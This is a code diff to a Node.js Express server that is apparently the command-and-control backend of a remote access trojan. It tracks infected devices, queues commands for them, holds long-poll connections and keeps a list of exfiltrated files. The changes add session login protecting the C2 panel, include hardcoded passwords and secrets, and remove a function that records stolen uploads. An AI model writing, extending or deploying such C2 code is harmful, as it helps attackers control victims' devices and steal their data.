@@ -1,19 +1,27 @@
-const checkAuth = (req, res, next) => {
-    if (!req.session.role) {
-        return res.redirect('/login');
-    }
-    next();
-};
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
+const session = require('express-session'); // Verifique se você tem o session instalado
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 const C2_PASSWORD = process.env.C2_PASSWORD || 'akarui869';
 let currentC2Password = C2_PASSWORD;
-// COLE AQUI (Antes de qualquer app.get ou app.post)
+
+// 1. CONFIGURAÇÃO DE SESSÃO (Essencial para o login funcionar)
+app.use(session({
+    secret: 'secret-key-rats-99',
+    resave: false,
+    saveUninitialized: true,
+    cookie: { secure: false } 
+}));
+
+app.use(cors());
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+
+// 2. O SEGURANÇA (Definição da função)
 const checkAuth = (req, res, next) => {
     if (!req.session.role) {
         return res.redirect('/login');
@@ -21,10 +29,9 @@ const checkAuth = (req, res, next) => {
     next();
 };
 
-app.use(cors());
-app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ extended: true, limit: '50mb' }));
-app.use('/c2', express.static(path.join(__dirname, 'c2')));
+// 3. PROTEÇÃO DA PASTA DE ARQUIVOS (Aqui é onde a mágica acontece)
+// Agora, para acessar qualquer arquivo na pasta /c2, ele PRECISA passar pelo checkAuth
+app.use('/c2', checkAuth, express.static(path.join(__dirname, 'c2')));
 
 const UPLOADS_DIR = path.join(__dirname, 'uploads');
 if (!fs.existsSync(UPLOADS_DIR)) {
@@ -35,7 +42,7 @@ app.use('/c2/downloads', express.static(UPLOADS_DIR));
 const devices = new Map();
 const commandQueues = new Map();
 const pendingResponses = new Map();
-const longPollWaiters = new Map(); // deviceId -> Array of res objects
+const longPollWaiters = new Map(); 
 const exfiltratedFiles = [];
 
 const DATA_FILE = path.join(__dirname, 'devices.json');
@@ -71,32 +78,6 @@ function saveData() {
 }
 
 loadData();
-
-function syncUploadsDirectory() {
-    try {
-        if (!fs.existsSync(UPLOADS_DIR)) return;
-        const filesOnDisk = fs.readdirSync(UPLOADS_DIR);
-        filesOnDisk.forEach(filename => {
-            if (filename.startsWith('.')) return;
-            const exists = exfiltratedFiles.some(f => f.filename === filename);
-            if (!exists) {
-                const filePath = path.join(UPLOADS_DIR, filename);
-                const stats = fs.statSync(filePath);
-
-                let origName = filename;
-                const match = filename.match(/^\d+_(.+)$/);
-                if (match) origName = match[1];
-
-                exfiltratedFiles.unshift({
-                    id: Math.random().toString(36).substring(7),
-                    filename: filename,
-                    originalName: origName,
-                    deviceId: 'Exfiltrated_Payload',
-                    size: stats.size,
-                    timestamp: stats.mtime.toISOString()
-                });
-            }
-        });
     } catch (e) {}
 }
 
